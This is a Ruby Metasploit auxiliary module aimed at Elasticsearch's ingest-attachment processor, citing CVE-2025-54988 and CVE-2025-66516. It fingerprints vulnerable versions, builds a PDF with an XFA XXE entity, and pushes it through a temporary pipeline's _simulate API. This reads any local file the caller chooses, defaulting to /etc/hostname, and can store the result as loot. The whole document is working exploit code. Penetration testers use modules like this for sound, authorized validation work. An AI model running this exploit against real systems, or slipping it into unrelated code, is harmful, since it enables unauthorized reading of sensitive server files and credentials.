##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Elasticsearch ingest-attachment Apache Tika XFA XXE Local File Read',
        'Description' => %q{
          This module validates CVE-2025-54988 / CVE-2025-66516 through an
          Elasticsearch ingest pipeline using the attachment processor. It creates
          a temporary pipeline, submits an in-memory PDF containing crafted XFA data
          to the _simulate API, extracts a caller-selected local file, and removes
          the pipeline in an ensure block.

          The target must permit pipeline creation, simulation, and deletion. The
          default proof file is /etc/hostname. No index or document is created.
        },
        'Author' => [
          'Jean-Marie Bourbon',
          'Bourbon Offensive Security Services'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-54988'],
          ['CVE', '2025-66516'],
          ['URL', 'https://discuss.elastic.co/t/381427']
        ],
        'DisclosureDate' => '2025-08-20',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(9200),
        OptString.new('TARGETURI', [true, 'Elasticsearch base path', '/']),
        OptString.new('FILEPATH', [true, 'Absolute file path to read', '/etc/hostname']),
        OptString.new('AUTHORIZATION', [false, 'Complete Authorization header value, such as ApiKey ... or Basic ...']),
        OptInt.new('INDEXED_CHARS', [true, 'Maximum extracted characters (-1 means unlimited)', 1048576]),
        OptBool.new('STORE_LOOT', [true, 'Store returned file content as loot', true])
      ]
    )
  end

  def request_headers
    headers = { 'Accept' => 'application/json' }
    auth = datastore['AUTHORIZATION'].to_s
    headers['Authorization'] = auth unless auth.empty?
    headers
  end

  def normalize_base
    normalize_uri(target_uri.path)
  end

  def pipeline_path(name)
    normalize_uri(normalize_base, '_ingest', 'pipeline', name)
  end

  def elasticsearch_version
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_base,
      'headers' => request_headers
    )
    return nil unless res&.code == 200

    json = res.get_json_document
    json.dig('version', 'number')
  rescue JSON::ParserError
    nil
  end

  def vulnerable_version?(version)
    return nil if version.nil?

    v = Rex::Version.new(version)
    return true if v >= Rex::Version.new('8.19.0') && v < Rex::Version.new('8.19.3')
    return true if v >= Rex::Version.new('9.0.0') && v < Rex::Version.new('9.0.6')
    return true if v >= Rex::Version.new('9.1.0') && v < Rex::Version.new('9.1.3')
    return false if v >= Rex::Version.new('8.18.6') && v < Rex::Version.new('8.19.0')
    return false if v >= Rex::Version.new('8.19.3') && v < Rex::Version.new('9.0.0')
    return false if v >= Rex::Version.new('9.0.6') && v < Rex::Version.new('9.1.0')
    return false if v >= Rex::Version.new('9.1.3')

    nil
  end

  def check_host(_ip)
    version = elasticsearch_version
    return CheckCode::Unknown('Elasticsearch version could not be identified') if version.nil?

    case vulnerable_version?(version)
    when true
      CheckCode::Appears("Elasticsearch #{version} is in an affected version range")
    when false
      CheckCode::Safe("Elasticsearch #{version} is outside the affected version ranges")
    else
      CheckCode::Detected("Elasticsearch #{version} detected; active validation is required")
    end
  end

  def xfa_xml(filepath)
    escaped = filepath.to_s
                      .gsub('&', '&amp;')
                      .gsub('"', '&quot;')
                      .gsub('<', '&lt;')
                      .gsub('>', '&gt;')

    <<~XML
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE xfa [<!ENTITY xxe SYSTEM "file://#{escaped}">]>
      <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
        <xdp:template>
          <template xmlns="http://www.xfa.org/schema/xfa-template/2.8/">
            <subform name="form1"><field name="field"/></subform>
          </template>
        </xdp:template>
        <xdp:datasets>
          <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
            <xfa:data><root><field>&xxe;</field></root></xfa:data>
          </xfa:datasets>
        </xdp:datasets>
      </xdp:xdp>
    XML
  end

  def build_pdf(filepath)
    xfa = xfa_xml(filepath).b
    chunks = ["%PDF-1.7\n%\xE2\xE3\xCF\xD3\n".b]
    offsets = {}

    add_object = lambda do |number, body|
      offsets[number] = chunks.sum(&:bytesize)
      chunks << "#{number} 0 obj\n".b << body.b << "\nendobj\n".b
    end

    add_object.call(1, '<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>')
    add_object.call(2, '<< /Type /Pages /Kids [3 0 R] /Count 1 >>')
    add_object.call(3, '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << >> >>')
    add_object.call(5, "<< /Length #{xfa.bytesize} >>\nstream\n".b + xfa + "\nendstream".b)
    add_object.call(4, '<< /NeedAppearances true /Fields [] /XFA 5 0 R >>')

    xref_offset = chunks.sum(&:bytesize)
    xref = "xref\n0 6\n0000000000 65535 f \n".b
    (1..5).each { |number| xref << format('%010d 00000 n ', offsets[number]) << "\n" }
    chunks << xref
    chunks << "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n#{xref_offset}\n%%EOF\n".b
    chunks.join
  end

  def parse_content(res)
    json = res.get_json_document
    doc = json.dig('docs', 0, 'doc')
    fail_with(Failure::UnexpectedReply, 'Unexpected _simulate response') unless doc.is_a?(Hash)
    fail_with(Failure::UnexpectedReply, "Attachment processor error: #{doc['error']}") if doc['error']

    content = doc.dig('_source', 'attachment', 'content')
    return nil unless content.is_a?(String)

    content.sub(/^\s*field\s*:\s*/i, '').rstrip
  rescue JSON::ParserError
    fail_with(Failure::UnexpectedReply, 'Elasticsearch returned invalid JSON')
  end

  def run_host(ip)
    unless datastore['FILEPATH'].start_with?('/')
      print_error('FILEPATH must be an absolute path')
      return
    end

    pipeline = "msf-tika-xfa-#{Rex::Text.rand_text_alphanumeric(10).downcase}"
    uri = pipeline_path(pipeline)
    created = false

    print_status("#{ip}:#{rport} - Creating temporary ingest pipeline #{pipeline}")
    begin
      body = {
        description: 'Temporary Metasploit authorized XFA XXE validation pipeline',
        processors: [
          {
            attachment: {
              field: 'data',
              target_field: 'attachment',
              indexed_chars: datastore['INDEXED_CHARS'],
              remove_binary: true
            }
          }
        ]
      }

      res = send_request_cgi(
        'method' => 'PUT',
        'uri' => uri,
        'ctype' => 'application/json',
        'headers' => request_headers,
        'data' => body.to_json
      )
      unless res&.code&.between?(200, 299)
        print_error("#{ip}:#{rport} - Pipeline creation failed#{res ? " (HTTP #{res.code})" : ''}")
        return
      end
      created = true

      payload = {
        docs: [
          {
            _index: '_index',
            _id: '1',
            _source: { data: Base64.strict_encode64(build_pdf(datastore['FILEPATH'])) }
          }
        ]
      }

      res = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri(uri, '_simulate'),
        'ctype' => 'application/json',
        'headers' => request_headers,
        'data' => payload.to_json
      )
      unless res&.code == 200
        print_error("#{ip}:#{rport} - Pipeline simulation failed#{res ? " (HTTP #{res.code})" : ''}")
        return
      end

      content = parse_content(res)
      if content.to_s.empty?
        print_error("#{ip}:#{rport} - No local file content was extracted")
        return
      end

      print_good("#{ip}:#{rport} - Read #{datastore['FILEPATH']} (#{content.bytesize} bytes)")
      print_line(content)
      report_vuln(host: ip, port: rport, proto: 'tcp', name: fullname, refs: references)

      if datastore['STORE_LOOT']
        path = store_loot('elasticsearch.tika.xxe', 'text/plain', ip, content, ::File.basename(datastore['FILEPATH']), 'Elasticsearch Tika XXE local file')
        print_good("#{ip}:#{rport} - Loot stored in: #{path}")
      end
    ensure
      if created
        cleanup = send_request_cgi(
        'method' => 'DELETE',
        'uri' => uri,
        'headers' => request_headers
      )
      if cleanup&.code&.between?(200, 299) || cleanup&.code == 404
        vprint_status("#{ip}:#{rport} - Temporary pipeline deleted")
        else
          print_warning("#{ip}:#{rport} - Temporary pipeline cleanup failed")
        end
      end
    end
  end
end
